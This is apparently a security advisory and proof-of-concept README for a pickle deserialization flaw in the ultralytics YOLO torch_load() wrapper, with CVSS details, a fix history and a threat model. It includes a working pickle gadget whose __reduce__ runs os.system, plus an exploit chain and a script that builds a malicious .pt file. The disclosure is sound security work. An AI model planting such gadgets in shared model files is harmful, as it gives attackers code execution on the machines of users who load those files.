# UltraPickle — ultralytics (YOLO) `torch_load()` pickle deserialization RCE (default, unpatched)

| Field | Value |
| --- | --- |
| Product | [ultralytics/ultralytics](https://github.com/ultralytics/ultralytics) (YOLO object-detection framework, ~32k★, ubiquitous) |
| Component | `ultralytics/utils/patches.py` — `torch_load()` |
| Affected | `main` (and 8.4.x — the "fix" in 8.4.67 is opt-in, default still unsafe) |
| CVSS 3.1 | **7.8 HIGH** `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` (ZDI rated 7.8) |
| CWE | CWE-502 (Deserialization of Untrusted Data) |
| CVE | [CVE-2026-118613](https://nvd.nist.gov/vuln/detail/CVE-2026-118613) (ZDI-CAN-29652) — **no fixed version** |
| Fix | PR [#24829](https://github.com/ultralytics/ultralytics/pull/24829) adds opt-in `ULTRALYTICS_SAFE_LOAD` (default off) |

## Summary

Ultralytics' `torch_load()` wrapper deliberately sets `weights_only=False` when
loading checkpoints, overriding PyTorch 2.6+'s safe `weights_only=True` default:

```python
def torch_load(*args, **kwargs):
    """Load a PyTorch object with `weights_only=False` by default so full checkpoints can be unpickled."""
    from ultralytics.utils.torch_utils import TORCH_1_13
    if TORCH_1_13 and "weights_only" not in kwargs:
        kwargs["weights_only"] = False   # <-- arbitrary pickle execution
    return torch.load(*args, **kwargs)
```

`torch.load(..., weights_only=False)` is plain `pickle` deserialization: it
reconstructs whatever object the checkpoint declares, invoking its
`__reduce__`.  Every `YOLO("model.pt")` therefore runs arbitrary code if the
`.pt` file is malicious — the default, with no warning and no allow-list.

## Vulnerability details

A `.pt` checkpoint is a pickle.  A minimal gadget:

```python
class Evil:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))
```

saved via `torch.save(Evil(), "evil.pt")` executes `id` when the victim runs
`YOLO("evil.pt")` (or any `torch_load` call), because the default path sets
`weights_only=False`.

### Exploit chain

```
attacker shares  evil.pt  (a torch checkpoint whose pickle runs os.system)
   └─► victim runs  YOLO("evil.pt")   /   torch_load("evil.pt")
         └─► torch.load(..., weights_only=False)   (the forced default)
               └─► pickle __reduce__ -> os.system("...")   == RCE
```

## Why this is still open

CVE-2026-118613 was assigned (ZDI-CAN-29652) and Ultralytics shipped PR #24829
in v8.4.67 — but that PR adds an **opt-in** `ULTRALYTICS_SAFE_LOAD` flag
(default off).  The default loading path is unchanged (`weights_only=False`),
so the vulnerability remains exploitable out of the box.  The NVD/ZDI/GHSA
records list **no fixed version**; the published mitigation is "avoid loading
`.pt` files from untrusted sources" or set `ULTRALYTICS_SAFE_LOAD=1`.

## Run

```
bash run.sh
```

Installs `torch` (CPU) if needed, builds a malicious `.pt`, and shows the
differential: `weights_only=False` (default) executes the payload (`RCE
CONFIRMED`), while `weights_only=True` (the opt-in flag) blocks it.

## Exploitability assessment (honest threat model)

- **Preconditions:** the victim loads a YOLO model checkpoint they do not fully
  trust — a shared/third-party model, a community hub download, a
  typosquatted/compromised URL.  This is the *documented* way to load a YOLO
  model, so no misuse is required.  `UI:R`, `AV:L` (the payload is the model
  file itself; the victim opens it).
- **Impact:** arbitrary code execution as the user running YOLO (the classic
  untrusted-model-deserialization class — cf. Stanza CVE-2026-115878, MLflow
  pickle-deser CVEs).
- **Boundaries / honest caveats:** this is **not** an unauthenticated remote RCE;
  it requires the victim to open a malicious model file.  The severity is HIGH
  (7.8) rather than CRITICAL because of `UI:R`/`AV:L`.  The fact that the
  upstream "fix" is opt-in — leaving the vulnerable default in place — is the
  reason this remains a live finding rather than a patched CVE.
